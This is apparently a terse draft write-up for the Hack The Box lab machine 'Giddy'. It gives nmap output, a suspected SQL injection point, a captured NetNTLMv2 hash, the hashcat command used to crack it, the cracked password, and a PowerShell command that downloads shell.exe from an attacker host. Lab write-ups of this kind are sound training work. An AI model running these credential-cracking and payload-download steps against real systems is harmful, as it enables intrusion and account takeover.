---
title: HTB Giddy
author: kei5uke
draft: true
description: Writeup for HTB Giddy
tags:
  - windows
  - writeup
---

# nmap

```bash
PORT     STATE SERVICE       VERSION                                                                                                                                                                                                                       
80/tcp   open  http          Microsoft IIS httpd 10.0                                                                                                                                                                                                      
|_http-title: IIS Windows Server                                                                                                                                                                                                                           
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                                                   
| http-methods:                                                                                                                                                                                                                                            
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2026-09-30T21:10:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite 
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa                                        
| Public Key bits: 1024                                       
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-06-16T21:28:55
| Not valid after:  2018-09-14T21:28:55
| MD5:   78a7:4af5:3b09:c882:a149:f977:cf8f:1182
|_SHA-1: 8adc:3379:878a:f13f:0154:406a:3ead:d345:6967:6a23
|_http-title: IIS Windows Server
| tls-alpn:                                                   
|   h2                                                        
|_  http/1.1                                                  
|_http-server-header: Microsoft-IIS/10.0
| http-methods:                                               
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Issuer: commonName=Giddy                                    
| Public Key type: rsa                                        
| Public Key bits: 2048                                       
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-29T21:02:05
| Not valid after:  2027-03-31T21:02:05
| MD5:   562e:e171:ffd2:6e63:5056:2470:8032:4c98
|_SHA-1: 6f25:fcb2:e76d:b5c0:da1b:bcf5:c6e0:5749:b75d:153e
| rdp-ntlm-info:                                              
|   Target_Name: GIDDY                                        
|   NetBIOS_Domain_Name: GIDDY                                
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy                                    
|   DNS_Computer_Name: Giddy                                  
|   Product_Version: 10.0.14393
|_  System_Time: 2026-09-30T21:10:29+00:00
|_ssl-date: 2026-09-30T21:10:34+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                       
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

![[HTB Giddy - image.png]]

![[HTB Giddy - image 1.png]]

[https://10.129.96.140/mvc/Search.aspx](https://10.129.96.140/mvc/Search.aspx) : SQL injection?

`jnogueira`

```
Stacy::GIDDY:1162328bf1bcff54:DA7974118C48A947908CC574407639DE:0101000000000000009F1E3A8B52DD01D21802E4F2E0C8150000000002000800530057003700430001001E00570049004
E002D005200490046004300380032005000420047005400560004003400570049004E002D00520049004600430038003200500042004700540056002E0053005700370043002E004C004F00430041004C000300140053005700370043002
E004C004F00430041004C000500140053005700370043002E004C004F00430041004C0007000800009F1E3A8B52DD0106000400020000000800300030000000000000000000000000300000A6002A84819261B05A9615AF1A97DC80E592C
89E0B85451F248D42BDEE833ACE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003100000000000000000000000000
```

`hashcat -m 5600 stacy_ntlm_res.txt /usr/share/wordlists/rockyou.txt.gz`

`xNnWo6272k7x`

`Invoke-WebRequest -Uri http://10.10.14.41/shell.exe -OutFile "shell.exe"`
